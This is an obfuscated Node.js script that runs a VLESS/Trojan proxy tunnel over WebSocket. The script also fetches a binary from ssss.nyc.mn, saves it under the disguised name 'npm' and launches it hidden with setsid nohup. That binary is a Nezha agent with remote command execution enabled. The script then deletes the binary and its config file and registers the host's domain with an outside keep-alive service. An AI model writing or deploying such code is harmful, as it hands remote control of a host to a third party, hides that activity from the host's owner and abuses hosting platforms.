const _0x171c80=_0x32b6;(function(_0x5b93ff,_0x43109b){const _0x51b00b=_0x32b6,_0xbfda3=_0x5b93ff();while(!![]){try{const _0x5e2b80=-parseInt(_0x51b00b(0x177))/0x1*(parseInt(_0x51b00b(0x15f))/0x2)+-parseInt(_0x51b00b(0x1a1))/0x3+-parseInt(_0x51b00b(0x166))/0x4+-parseInt(_0x51b00b(0x158))/0x5*(-parseInt(_0x51b00b(0x1aa))/0x6)+-parseInt(_0x51b00b(0x14b))/0x7+parseInt(_0x51b00b(0x192))/0x8+parseInt(_0x51b00b(0x1b8))/0x9*(parseInt(_0x51b00b(0x162))/0xa);if(_0x5e2b80===_0x43109b)break;else _0xbfda3['push'](_0xbfda3['shift']());}catch(_0x29b78b){_0xbfda3['push'](_0xbfda3['shift']());}}}(_0x434e,0x5b60d));function _0x434e(){const _0x157f8c=['Automatic\x20Access\x20Task\x20added\x20successfully','https://amd64.ssss.nyc.mn/agent','&path=%2F','then','86516091-8446-457c-8d7f-1bd936f05230','pipe','once','2032833iYARRE','2087','config.yaml','writeFileSync','UUID','finish','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','crypto','&type=A','247734RojWTC','find','https://arm64.ssss.nyc.mn/v1','npm\x20is\x20running','slice','DOMAIN','net','NEZHA_KEY','from','end','setsid\x20nohup\x20./npm\x20-s\x20','NAME','createServer','digest','8228961HunIfv','substr','path','concat','aarch64','url','trim','reduce','base64',':443?encryption=none&security=tls&sni=','https://api.ip.sb/geoip','\x20with\x20all\x20DNS\x20servers','npm\x20running\x20error:','hex','text/plain','close','npm\x20is\x20already\x20running,\x20skip\x20running...','Failed\x20to\x20resolve\x20','error:\x20','3069353CTIsKQ','arm','toString','https://oooo.serv00.net/add-url','connection','write','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','test','post','send','PORT','createHash','70TJVbLt','readUInt8','https://arm64.ssss.nyc.mn/agent','split','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','sha224','WSPATH','56954CBwJMl','AUTO_ACCESS','SUB_PATH','10xLTzAM','writeHead','trojan://','2096','1558460qMgkCx','includes','/bin/bash','child_process','readUInt16BE','npm\x20download\x20successfully','arm64','https://','--tls','country_code','every','replace','join','2083','Answer','8443','https://amd64.ssss.nyc.mn/v1','6BpyPZC','decode','utf8','1234.abc.com','error','npm','http','Server','createWriteStream','NEZHA_PORT','listen','catch','NEZHA_SERVER','true','false','connect','get','axios','stream','env','text/html','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','map','unlink','buffer','length','isp','4467816ACisoD','data','8.8.4.4','log','Hello\x20world!','Status','&fp=chrome&type=ws&host=','readFile'];_0x434e=function(){return _0x157f8c;};return _0x434e();}const os=require('os'),http=require(_0x171c80(0x17d)),fs=require('fs'),axios=require(_0x171c80(0x188)),net=require(_0x171c80(0x1b0)),path=require(_0x171c80(0x1ba)),crypto=require(_0x171c80(0x1a8)),{Buffer}=require(_0x171c80(0x18f)),{exec,execSync}=require(_0x171c80(0x169)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x171c80(0x18a)][_0x171c80(0x1a5)]||_0x171c80(0x19e),NEZHA_SERVER=process['env'][_0x171c80(0x183)]||'',NEZHA_PORT=process[_0x171c80(0x18a)][_0x171c80(0x180)]||'',NEZHA_KEY=process[_0x171c80(0x18a)][_0x171c80(0x1b1)]||'',DOMAIN=process[_0x171c80(0x18a)][_0x171c80(0x1af)]||_0x171c80(0x17a),AUTO_ACCESS=process[_0x171c80(0x18a)][_0x171c80(0x160)]||!![],WSPATH=process[_0x171c80(0x18a)][_0x171c80(0x15e)]||UUID[_0x171c80(0x1ae)](0x0,0x8),SUB_PATH=process['env'][_0x171c80(0x161)]||'sub',NAME=process['env'][_0x171c80(0x1b5)]||'',PORT=process[_0x171c80(0x18a)][_0x171c80(0x156)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x411e0f=_0x171c80;try{const _0x5a5353=await axios['get'](_0x411e0f(0x142)),_0x48cdfb=_0x5a5353[_0x411e0f(0x193)];ISP=(_0x48cdfb[_0x411e0f(0x16f)]+'-'+_0x48cdfb[_0x411e0f(0x191)])[_0x411e0f(0x171)](/ /g,'_');}catch(_0x27cc6f){ISP='Unknown';}};GetISP();const httpServer=http[_0x171c80(0x1b6)]((_0x16dd93,_0x46677e)=>{const _0x1da7c5=_0x171c80;if(_0x16dd93[_0x1da7c5(0x13d)]==='/'){const _0x30ad9c=path[_0x1da7c5(0x172)](__dirname,'index.html');fs[_0x1da7c5(0x199)](_0x30ad9c,_0x1da7c5(0x179),(_0x2a5eac,_0x142ef6)=>{const _0x5dccce=_0x1da7c5;if(_0x2a5eac){_0x46677e[_0x5dccce(0x163)](0xc8,{'Content-Type':_0x5dccce(0x18b)}),_0x46677e['end'](_0x5dccce(0x196));return;}_0x46677e[_0x5dccce(0x163)](0xc8,{'Content-Type':_0x5dccce(0x18b)}),_0x46677e['end'](_0x142ef6);});return;}else{if(_0x16dd93[_0x1da7c5(0x13d)]==='/'+SUB_PATH){const _0x36a76c=NAME?NAME+'-'+ISP:ISP,_0xf11f4='vless://'+UUID+'@'+DOMAIN+_0x1da7c5(0x141)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x1da7c5(0x19c)+WSPATH+'#'+_0x36a76c,_0x46fcef=_0x1da7c5(0x164)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x1da7c5(0x198)+DOMAIN+_0x1da7c5(0x19c)+WSPATH+'#'+_0x36a76c,_0x3ccb03=_0xf11f4+'\x0a'+_0x46fcef,_0x3e9e8c=Buffer[_0x1da7c5(0x1b2)](_0x3ccb03)[_0x1da7c5(0x14d)](_0x1da7c5(0x140));_0x46677e[_0x1da7c5(0x163)](0xc8,{'Content-Type':_0x1da7c5(0x146)}),_0x46677e[_0x1da7c5(0x1b3)](_0x3e9e8c+'\x0a');}else _0x46677e[_0x1da7c5(0x163)](0x194,{'Content-Type':_0x1da7c5(0x146)}),_0x46677e['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x171c80(0x17e))]({'server':httpServer}),uuid=UUID[_0x171c80(0x171)](/-/g,''),DNS_SERVERS=[_0x171c80(0x194),'1.1.1.1'];function resolveHost(_0x67de1c){return new Promise((_0x53a1f2,_0x3f5254)=>{const _0x2606bb=_0x32b6;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2606bb(0x153)](_0x67de1c)){_0x53a1f2(_0x67de1c);return;}let _0x58908c=0x0;function _0x3ff2e6(){const _0x5614a2=_0x2606bb;if(_0x58908c>=DNS_SERVERS[_0x5614a2(0x190)]){_0x3f5254(new Error(_0x5614a2(0x149)+_0x67de1c+_0x5614a2(0x143)));return;}const _0x24a760=DNS_SERVERS[_0x58908c];_0x58908c++;const _0xf1dd44='https://dns.google/resolve?name='+encodeURIComponent(_0x67de1c)+_0x5614a2(0x1a9);axios[_0x5614a2(0x187)](_0xf1dd44,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x5614a2(0x19d)](_0x3522da=>{const _0x352f=_0x5614a2,_0x436e88=_0x3522da['data'];if(_0x436e88[_0x352f(0x197)]===0x0&&_0x436e88[_0x352f(0x174)]&&_0x436e88[_0x352f(0x174)][_0x352f(0x190)]>0x0){const _0x5eeadb=_0x436e88['Answer'][_0x352f(0x1ab)](_0x1870ee=>_0x1870ee['type']===0x1);if(_0x5eeadb){_0x53a1f2(_0x5eeadb[_0x352f(0x193)]);return;}}_0x3ff2e6();})[_0x5614a2(0x182)](_0x150b01=>{_0x3ff2e6();});}_0x3ff2e6();});}function handleVlessConnection(_0x2e5f72,_0x4a9924){const _0x41aef6=_0x171c80,[_0x39b314]=_0x4a9924,_0x432679=_0x4a9924[_0x41aef6(0x1ae)](0x1,0x11);if(!_0x432679[_0x41aef6(0x170)]((_0x5c7d7f,_0x1891ed)=>_0x5c7d7f==parseInt(uuid[_0x41aef6(0x1b9)](_0x1891ed*0x2,0x2),0x10)))return![];let _0x9152d0=_0x4a9924[_0x41aef6(0x1ae)](0x11,0x12)['readUInt8']()+0x13;const _0x5994c0=_0x4a9924[_0x41aef6(0x1ae)](_0x9152d0,_0x9152d0+=0x2)['readUInt16BE'](0x0),_0x5ad571=_0x4a9924['slice'](_0x9152d0,_0x9152d0+=0x1)[_0x41aef6(0x159)](),_0x342eb7=_0x5ad571==0x1?_0x4a9924[_0x41aef6(0x1ae)](_0x9152d0,_0x9152d0+=0x4)[_0x41aef6(0x172)]('.'):_0x5ad571==0x2?new TextDecoder()[_0x41aef6(0x178)](_0x4a9924[_0x41aef6(0x1ae)](_0x9152d0+0x1,_0x9152d0+=0x1+_0x4a9924[_0x41aef6(0x1ae)](_0x9152d0,_0x9152d0+0x1)[_0x41aef6(0x159)]())):_0x5ad571==0x3?_0x4a9924['slice'](_0x9152d0,_0x9152d0+=0x10)[_0x41aef6(0x13f)]((_0x59e11a,_0x5a686d,_0x5ccca5,_0x4d0dd6)=>_0x5ccca5%0x2?_0x59e11a[_0x41aef6(0x1bb)](_0x4d0dd6[_0x41aef6(0x1ae)](_0x5ccca5-0x1,_0x5ccca5+0x1)):_0x59e11a,[])[_0x41aef6(0x18d)](_0x265454=>_0x265454[_0x41aef6(0x16a)](0x0)[_0x41aef6(0x14d)](0x10))[_0x41aef6(0x172)](':'):'';_0x2e5f72[_0x41aef6(0x155)](new Uint8Array([_0x39b314,0x0]));const _0x176856=createWebSocketStream(_0x2e5f72);return resolveHost(_0x342eb7)['then'](_0x40b781=>{const _0x45e485=_0x41aef6;net['connect']({'host':_0x40b781,'port':_0x5994c0},function(){const _0x1ac4c6=_0x32b6;this['write'](_0x4a9924[_0x1ac4c6(0x1ae)](_0x9152d0)),_0x176856['on'](_0x1ac4c6(0x17b),()=>{})[_0x1ac4c6(0x19f)](this)['on'](_0x1ac4c6(0x17b),()=>{})[_0x1ac4c6(0x19f)](_0x176856);})['on'](_0x45e485(0x17b),()=>{});})[_0x41aef6(0x182)](_0x356b0e=>{const _0x2354f4=_0x41aef6;net[_0x2354f4(0x186)]({'host':_0x342eb7,'port':_0x5994c0},function(){const _0x5e1726=_0x2354f4;this[_0x5e1726(0x150)](_0x4a9924['slice'](_0x9152d0)),_0x176856['on']('error',()=>{})[_0x5e1726(0x19f)](this)['on']('error',()=>{})[_0x5e1726(0x19f)](_0x176856);})['on'](_0x2354f4(0x17b),()=>{});}),!![];}function handleTrojanConnection(_0x458eb,_0xc731f7){const _0xf535e0=_0x171c80;try{if(_0xc731f7[_0xf535e0(0x190)]<0x3a)return![];const _0x5e8415=_0xc731f7[_0xf535e0(0x1ae)](0x0,0x38)[_0xf535e0(0x14d)](),_0xbda58d=[UUID];let _0x116faa=null;for(const _0x27c326 of _0xbda58d){const _0x100b29=crypto[_0xf535e0(0x157)](_0xf535e0(0x15d))['update'](_0x27c326)[_0xf535e0(0x1b7)](_0xf535e0(0x145));if(_0x100b29===_0x5e8415){_0x116faa=_0x27c326;break;}}if(!_0x116faa)return![];let _0x3a1ef1=0x38;_0xc731f7[_0x3a1ef1]===0xd&&_0xc731f7[_0x3a1ef1+0x1]===0xa&&(_0x3a1ef1+=0x2);const _0xdb0af4=_0xc731f7[_0x3a1ef1];if(_0xdb0af4!==0x1)return![];_0x3a1ef1+=0x1;const _0x2a93cc=_0xc731f7[_0x3a1ef1];_0x3a1ef1+=0x1;let _0x47bdef,_0xaf8873;if(_0x2a93cc===0x1)_0x47bdef=_0xc731f7[_0xf535e0(0x1ae)](_0x3a1ef1,_0x3a1ef1+0x4)[_0xf535e0(0x172)]('.'),_0x3a1ef1+=0x4;else{if(_0x2a93cc===0x3){const _0x315a1f=_0xc731f7[_0x3a1ef1];_0x3a1ef1+=0x1,_0x47bdef=_0xc731f7[_0xf535e0(0x1ae)](_0x3a1ef1,_0x3a1ef1+_0x315a1f)[_0xf535e0(0x14d)](),_0x3a1ef1+=_0x315a1f;}else{if(_0x2a93cc===0x4)_0x47bdef=_0xc731f7[_0xf535e0(0x1ae)](_0x3a1ef1,_0x3a1ef1+0x10)['reduce']((_0x495017,_0x326478,_0x579239,_0x5de338)=>_0x579239%0x2?_0x495017['concat'](_0x5de338[_0xf535e0(0x1ae)](_0x579239-0x1,_0x579239+0x1)):_0x495017,[])[_0xf535e0(0x18d)](_0x3e4a34=>_0x3e4a34[_0xf535e0(0x16a)](0x0)[_0xf535e0(0x14d)](0x10))[_0xf535e0(0x172)](':'),_0x3a1ef1+=0x10;else return![];}}_0xaf8873=_0xc731f7[_0xf535e0(0x16a)](_0x3a1ef1),_0x3a1ef1+=0x2;_0x3a1ef1<_0xc731f7['length']&&_0xc731f7[_0x3a1ef1]===0xd&&_0xc731f7[_0x3a1ef1+0x1]===0xa&&(_0x3a1ef1+=0x2);const _0x2062fe=createWebSocketStream(_0x458eb);return resolveHost(_0x47bdef)['then'](_0x329ba3=>{const _0x252ec1=_0xf535e0;net[_0x252ec1(0x186)]({'host':_0x329ba3,'port':_0xaf8873},function(){const _0x53f102=_0x252ec1;_0x3a1ef1<_0xc731f7[_0x53f102(0x190)]&&this['write'](_0xc731f7['slice'](_0x3a1ef1)),_0x2062fe['on'](_0x53f102(0x17b),()=>{})[_0x53f102(0x19f)](this)['on']('error',()=>{})['pipe'](_0x2062fe);})['on'](_0x252ec1(0x17b),()=>{});})[_0xf535e0(0x182)](_0x3db612=>{const _0x2c088e=_0xf535e0;net[_0x2c088e(0x186)]({'host':_0x47bdef,'port':_0xaf8873},function(){const _0x565b98=_0x2c088e;_0x3a1ef1<_0xc731f7['length']&&this['write'](_0xc731f7['slice'](_0x3a1ef1)),_0x2062fe['on'](_0x565b98(0x17b),()=>{})[_0x565b98(0x19f)](this)['on'](_0x565b98(0x17b),()=>{})['pipe'](_0x2062fe);})['on'](_0x2c088e(0x17b),()=>{});}),!![];}catch(_0x3a43fb){return![];}}wss['on'](_0x171c80(0x14f),(_0x41af6c,_0x20f514)=>{const _0x572f07=_0x171c80,_0x2fe699=_0x20f514['url']||'';_0x41af6c[_0x572f07(0x1a0)]('message',_0x4ae767=>{const _0x3da622=_0x572f07;if(_0x4ae767[_0x3da622(0x190)]>0x11&&_0x4ae767[0x0]===0x0){const _0x426e42=_0x4ae767[_0x3da622(0x1ae)](0x1,0x11),_0xd8df9c=_0x426e42['every']((_0x3f38e8,_0x5675f5)=>_0x3f38e8==parseInt(uuid['substr'](_0x5675f5*0x2,0x2),0x10));if(_0xd8df9c){!handleVlessConnection(_0x41af6c,_0x4ae767)&&_0x41af6c['close']();return;}}!handleTrojanConnection(_0x41af6c,_0x4ae767)&&_0x41af6c[_0x3da622(0x147)]();})['on'](_0x572f07(0x17b),()=>{});});function _0x32b6(_0x308754,_0x4d7a3c){_0x308754=_0x308754-0x13d;const _0x434ef2=_0x434e();let _0x32b656=_0x434ef2[_0x308754];return _0x32b656;}const getDownloadUrl=()=>{const _0x44615f=_0x171c80,_0x2288f4=os['arch']();return _0x2288f4===_0x44615f(0x14c)||_0x2288f4===_0x44615f(0x16c)||_0x2288f4===_0x44615f(0x1bc)?!NEZHA_PORT?_0x44615f(0x1ac):_0x44615f(0x15a):!NEZHA_PORT?_0x44615f(0x176):_0x44615f(0x19b);},downloadFile=async()=>{const _0x4d0b0f=_0x171c80;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x150de4=getDownloadUrl(),_0x344581=await axios({'method':_0x4d0b0f(0x187),'url':_0x150de4,'responseType':_0x4d0b0f(0x189)}),_0x182b96=fs[_0x4d0b0f(0x17f)](_0x4d0b0f(0x17c));return _0x344581[_0x4d0b0f(0x193)][_0x4d0b0f(0x19f)](_0x182b96),new Promise((_0x13bb46,_0x32df20)=>{const _0x37d8a9=_0x4d0b0f;_0x182b96['on'](_0x37d8a9(0x1a6),()=>{const _0x185688=_0x37d8a9;console['log'](_0x185688(0x16b)),exec('chmod\x20+x\x20npm',_0x145ee7=>{if(_0x145ee7)_0x32df20(_0x145ee7);_0x13bb46();});}),_0x182b96['on']('error',_0x32df20);});}catch(_0xea8ab){throw _0xea8ab;}},runnz=async()=>{const _0x3e0e49=_0x171c80;try{const _0x55ca6a=execSync(_0x3e0e49(0x151),{'encoding':'utf-8'});if(_0x55ca6a[_0x3e0e49(0x13e)]()!==''){console['log'](_0x3e0e49(0x148));return;}}catch(_0x58b023){}await downloadFile();let _0xdcf20e='',_0x33c4ad=['443',_0x3e0e49(0x175),_0x3e0e49(0x165),_0x3e0e49(0x1a2),_0x3e0e49(0x173),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x24f8f7=_0x33c4ad[_0x3e0e49(0x167)](NEZHA_PORT)?_0x3e0e49(0x16e):'';_0xdcf20e=_0x3e0e49(0x1b4)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x24f8f7+_0x3e0e49(0x15c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x25e05e=NEZHA_SERVER[_0x3e0e49(0x167)](':')?NEZHA_SERVER[_0x3e0e49(0x15b)](':')['pop']():'',_0x3b617a=_0x33c4ad['includes'](_0x25e05e)?_0x3e0e49(0x184):_0x3e0e49(0x185),_0x11d2a1='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3e0e49(0x18c)+_0x3b617a+_0x3e0e49(0x152)+UUID;fs[_0x3e0e49(0x1a4)](_0x3e0e49(0x1a3),_0x11d2a1);}_0xdcf20e='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x3e0e49(0x195)](_0x3e0e49(0x1a7));return;}}try{exec(_0xdcf20e,{'shell':_0x3e0e49(0x168)},_0x39b1f2=>{const _0x3e136c=_0x3e0e49;if(_0x39b1f2)console[_0x3e136c(0x17b)](_0x3e136c(0x144),_0x39b1f2);else console[_0x3e136c(0x195)](_0x3e136c(0x1ad));});}catch(_0x1e2f2a){console[_0x3e0e49(0x17b)](_0x3e0e49(0x14a)+_0x1e2f2a);}};async function addAccessTask(){const _0x32760a=_0x171c80;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2b91be=_0x32760a(0x16d)+DOMAIN;try{const _0x165969=await axios[_0x32760a(0x154)](_0x32760a(0x14e),{'url':_0x2b91be},{'headers':{'Content-Type':'application/json'}});console[_0x32760a(0x195)](_0x32760a(0x19a));}catch(_0x1ab491){}}const delFiles=()=>{const _0x23182d=_0x171c80;fs[_0x23182d(0x18e)](_0x23182d(0x17c),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer[_0x171c80(0x181)](PORT,()=>{const _0x540303=_0x171c80;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x540303(0x195)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
